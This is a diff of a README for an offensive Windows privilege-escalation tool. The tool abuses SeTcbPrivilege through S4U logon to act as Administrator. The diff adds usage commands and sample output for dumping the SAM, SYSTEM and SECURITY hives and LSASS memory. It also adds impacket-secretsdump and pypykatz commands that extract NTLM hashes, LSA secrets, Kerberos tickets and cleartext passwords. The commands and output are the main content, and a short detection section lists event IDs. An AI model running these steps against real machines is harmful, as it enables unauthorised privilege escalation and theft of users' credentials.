@@ -1,6 +1,6 @@
 # SeTcbPrivilege-Escalation
 
-Exploit **SeTcbPrivilege** to impersonate any local user without password via S4U (`LsaLogonUser` with `MSV1_0_S4U_LOGON`). Read files, list directories, and execute commands as Administrator. PowerShell + inline C# — no compilation needed.
+Exploit **SeTcbPrivilege** to impersonate any local user without password via S4U (`LsaLogonUser` with `MSV1_0_S4U_LOGON`). Read files, list directories, execute commands, dump registry hives, and dump LSASS — all as Administrator. PowerShell + inline C# — no compilation needed.
 
 ## How it works
 
@@ -11,7 +11,7 @@ The script:
 2. Registers a logon process with `LsaRegisterLogonProcess`
 3. Performs an S4U logon with `LsaLogonUser` (MSV1_0 package, type 12)
 4. Calls `ImpersonateLoggedOnUser` to assume the target user's identity
-5. Reads files, lists directories, or executes commands in that context
+5. Performs the requested action (read, dir, exec, savehives, dumplsass) in that context
 
 ## Requirements
 
@@ -31,17 +31,38 @@ powershell -ep bypass -File s4u_run.ps1 -Action read -Target "C:\Users\Administr
 powershell -ep bypass -File s4u_run.ps1 -Action dir -Target "C:\Users\Administrator\Desktop"
 
 # Execute a command as Administrator
-powershell -ep bypass -File s4u_run.ps1 -Action exec -Target "whoami /priv"
+powershell -ep bypass -File s4u_run.ps1 -Action exec -Target "net user Administrator"
+
+# Read a binary file as base64
+powershell -ep bypass -File s4u_run.ps1 -Action readb64 -Target "C:\Users\Administrator\Documents\secret.zip"
+
+# Dump SAM, SYSTEM, SECURITY registry hives
+powershell -ep bypass -File s4u_run.ps1 -Action savehives
+
+# Dump LSASS process memory
+powershell -ep bypass -File s4u_run.ps1 -Action dumplsass
 ```
+
+### Actions
+
+| Action | Description |
+|--------|-------------|
+| `read` | Read a file as the impersonated user |
+| `dir` | List a directory as the impersonated user |
+| `exec` | Execute a command via `cmd /c` |
+| `readb64` | Read a binary file and output as base64 |
+| `savehives` | Dump SAM + SYSTEM + SECURITY via `RegSaveKey` (requires `SeBackupPrivilege` on the impersonated user) |
+| `dumplsass` | Dump LSASS via `MiniDumpWriteDump` (enables `SeDebugPrivilege` on the process token) |
 
 ### Parameters
 
 | Parameter | Required | Default | Description |
 |-----------|----------|---------|-------------|
-| `-Action` | Yes | — | `read`, `dir`, or `exec` |
-| `-Target` | Yes | — | File path, directory path, or command |
+| `-Action` | Yes | — | `read`, `dir`, `exec`, `readb64`, `savehives`, or `dumplsass` |
+| `-Target` | Yes* | — | File path, directory path, or command (*not needed for `savehives`/`dumplsass`) |
 | `-User` | No | `Administrator` | User to impersonate |
 | `-Domain` | No | `SRV01` | Machine/domain name |
+| `-OutDir` | No | `C:\Liferay` | Output directory for `savehives` and `dumplsass` |
 
 ### Impersonate a different user
 
@@ -67,17 +88,45 @@ PS C:\> powershell -ep bypass -File s4u_run.ps1 -Action read -Target "C:\Users\A
 PS C:\> powershell -ep bypass -File s4u_run.ps1 -Action dir -Target "C:\Users\Administrator\Desktop"
 C:\Users\Administrator\Desktop\desktop.ini
 C:\Users\Administrator\Desktop\flag.txt
+
+PS C:\> powershell -ep bypass -File s4u_run.ps1 -Action savehives -OutDir "C:\Temp"
+SAM: OK
+SYSTEM: OK
+SECURITY: OK
 ```
+
+## Post-exploitation: extracting hashes
+
+After dumping the hives with `savehives`, transfer them to your attack machine and run:
+
+```bash
+impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCAL
+```
+
+This extracts:
+- **SAM** — local NTLM hashes (Administrator, local users)
+- **SECURITY** — LSA secrets (service account passwords, cached domain credentials DCC2)
+
+After dumping LSASS with `dumplsass`, use:
+
+```bash
+pypykatz lsa minidump lsass.dmp
+```
+
+This extracts:
+- Active logon sessions (NTLM hashes, Kerberos tickets)
+- Cleartext passwords (if WDigest is enabled)
 
 ## Note on `exec` action
 
-The `exec` action spawns `cmd.exe /c <command>` under the impersonated thread. However, `whoami` may still show the original user because child processes inherit the **process token**, not the thread impersonation token. File operations (`read`, `dir`) work correctly because they run directly in the impersonated thread context.
+The `exec` action spawns `cmd.exe /c <command>` under the impersonated thread. However, child processes inherit the **process token**, not the thread impersonation token. This means `whoami` will show the original user, not the impersonated one. File operations (`read`, `dir`, `readb64`, `savehives`) work correctly because they run directly in the impersonated thread context.
 
 ## Detection
 
 - Event ID **4624** with Logon Type **12** (S4U / NewCredentials) and package `MICROSOFT_AUTHENTICATION_PACKAGE_V1_0`
 - Process name registered via `LsaRegisterLogonProcess` (default: `JavaSvc`)
 - `Add-Type` usage with P/Invoke signatures for `secur32.dll` / `ntdll.dll`
+- `MiniDumpWriteDump` call from a non-standard process (for `dumplsass`)
 
 ## References
 
